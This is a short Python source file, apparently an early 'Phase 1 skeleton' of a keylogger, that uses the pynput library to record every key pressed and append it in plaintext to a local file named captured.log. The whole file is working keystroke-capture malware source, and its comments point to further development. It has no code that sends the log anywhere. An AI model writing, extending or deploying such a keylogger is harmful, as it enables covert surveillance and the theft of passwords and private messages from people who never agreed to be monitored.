# keylogger.py - Phase 1 skeleton
from pynput import keyboard

LOG_FILE = "captured.log"  # temporary, plaintext for now

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()